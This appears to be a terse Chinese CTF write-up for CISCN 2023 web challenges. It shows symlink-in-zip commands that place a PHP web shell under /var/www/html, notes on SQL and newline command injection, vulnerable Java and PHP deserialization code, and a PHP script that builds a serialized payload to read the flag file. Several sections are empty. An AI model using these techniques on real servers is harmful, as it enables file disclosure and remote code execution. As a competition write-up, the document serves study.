
# web
### unzip

上传一个指向 /var/www/html 的软连接 root.zip
```shell
ln -s /var/www/html root;zip -y root.zip root
```


上传一个指向 root/shell.php 的软连接
```shell
mkdir root;nano root/shell.php;zip -ry shell.zip root/
```

访问url+shell.php

### dumpit

访问url,得到提示

> use ?db=&table_2_query= or ?db=&table_2_dump= to view the tables! etc:?db=ctf&table_2_query=flag1

给的参数分两种

1. ?db=&table_2_query= 指定数据库和表查询,存在sql注入
2. ?db=&table_2_dump= 根据db和dump参数生成dumplog文档

sql注入发现没有flag

参数存在 `%00` 时会报错



猜测命令执行,使用 %0A换行绕过,执行多条命令

### BackendService

---

### go_session


### DeserBug
#java
```java
public class Testapp {
    public static void main(String[] args) {
        HttpUtil.createServer(8888).addAction("/", request, response -> {
            String result;
            String bugstr = request.getParam("bugstr");
            if (bugstr == null) {
                response.write("welcome,plz give me bugstr", ContentType.TEXT_PLAIN.toString());
            }
            try {
                byte[] decode = Base64.getDecoder().decode(bugstr);
                ObjectInputStream inputStream = new ObjectInputStream(new ByteArrayInputStream(decode));
                Object object = inputStream.readObject();
                result = object.toString();
            } catch (Exception e) {
                Myexpect myexpect = new Myexpect();
                myexpect.setTypeparam(new Class[]{String.class});
                myexpect.setTypearg(new String[]{e.toString()});
                myexpect.setTargetclass(e.getClass());
                try {
                    result = myexpect.getAnyexcept().toString();
                } catch (Exception ex) {
                    result = ex.toString();
                }
            }
            response.write(result, ContentType.TEXT_PLAIN.toString());
        }).start();
    }
}
```
接收`bugstr`参数进行反序列化

### [CISCN 2023 华北]ez_date
#hash
```php
<?php
error_reporting(0);
highlight_file(__FILE__);
class date{
    public $a;
    public $b;
    public $file;
    public function __wakeup()
    {
        if(is_array($this->a)||is_array($this->b)){
            die('no array');
        }
        //弱比较  1与'1'比较
        if( ($this->a !== $this->b) && (md5($this->a) === md5($this->b)) && (sha1($this->a)=== sha1($this->b)) ){
            $content=date($this->file);
            $uuid=uniqid().'.txt';
            file_put_contents($uuid,$content);
            $data=preg_replace('/((\s)*(\n)+(\s)*)/i','',file_get_contents($uuid));
            echo file_get_contents($data);
        }
        else{
            die();
        }
    }
}

unserialize(base64_decode($_GET['code']));
```

```php
<?php  
class date{  
public $a;  
public $b;  
public $file;  
}  
$a=new date();  
$a->a=1;  
$a->b='1';  
$a->file='/f\l\a\g';  
echo base64_encode(serialize($a));  
?>
```

# reverse

# pwn

# crypto

# Misc


---
## *相关wp*




2023-05-27   12:58